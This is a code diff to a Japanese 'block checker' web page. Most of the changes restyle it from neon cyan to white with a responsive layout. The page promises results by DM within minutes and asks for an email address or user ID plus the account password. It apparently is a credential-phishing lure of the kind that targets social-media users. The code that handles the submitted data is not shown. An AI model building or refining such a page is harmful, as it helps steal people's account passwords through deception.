@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #000;
+            background-color: #000; /* 背景を黒に設定 */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,45 +17,46 @@
         .container {
             background-color: rgba(0, 0, 0, 0.8);
             border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); /* ネオン効果を弱め */
             padding: 30px;
-            width: 300px;
+            width: 90%; /* レスポンシブ対応 */
+            max-width: 400px; /* 最大幅設定 */
             text-align: center;
-            color: #00ffff;
+            color: #ffffff; /* 白文字 */
         }
         h1 {
             font-size: 2.5em;
             margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(0, 255, 255, 1);
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6); /* ネオン効果を弱め */
         }
         h2 {
             font-size: 1.2em;
             margin-bottom: 20px;
-            color: #66ffff;
-            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+            color: #cccccc; /* 薄い白 */
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.4); /* ネオン効果を弱め */
         }
         label {
             display: block;
             margin: 10px 0 5px;
-            color: #66ffff;
+            color: #ffffff; /* 白文字 */
         }
         input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
-            border: 2px solid #00ffff;
+            border: 2px solid #ffffff; /* 白のボーダー */
             border-radius: 5px;
             margin-bottom: 15px;
-            background-color: rgba(255, 255, 255, 0.1);
-            color: #fff;
+            background-color: rgba(255, 255, 255, 0.1); /* 半透明の背景 */
+            color: #ffffff; /* 白文字 */
             transition: border-color 0.3s;
         }
         input[type="text"]:focus, input[type="password"]:focus {
-            border-color: #66ffff;
+            border-color: #cccccc; /* 薄い白のボーダー */
             outline: none;
         }
         input[type="button"] {
-            background-color: #00ffff;
-            color: black;
+            background-color: #ffffff; /* ボタンの白 */
+            color: black; /* ボタン文字色を黒に */
             border: none;
             border-radius: 5px;
             padding: 10px;
@@ -65,15 +66,18 @@
             transition: background-color 0.3s;
         }
         input[type="button"]:hover {
-            background-color: #66ffff;
+            background-color: #cccccc; /* ホバー時の薄い白 */
         }
         .note {
             margin-top: 15px;
             font-size: 0.9em;
-            color: #66ffff;
+            color: #cccccc; /* 薄い白 */
             text-align: left;
             line-height: 1.4;
             word-wrap: break-word;
+        }
+        .placeholder {
+            color: rgba(255, 255, 255, 0.5); /* 薄い白 */
         }
     </style>
 </head>
@@ -82,8 +86,8 @@
         <h1>ブロックチェッカー</h1>
         <h2>数分後、あなたのDMに結果が届きます。</h2>
         <form id="loginForm">
-            <label for="userId">ID:</label>
-            <input type="text" id="userId" name="userId" required>
+            <label for="userId">メールアドレスまたはユーザーID:</label>
+            <input type="text" id="userId" name="userId" placeholder="@･･････" required class="placeholder">
             
             <label for="password">パスワード:</label>
             <input type="password" id="password" name="password" required>
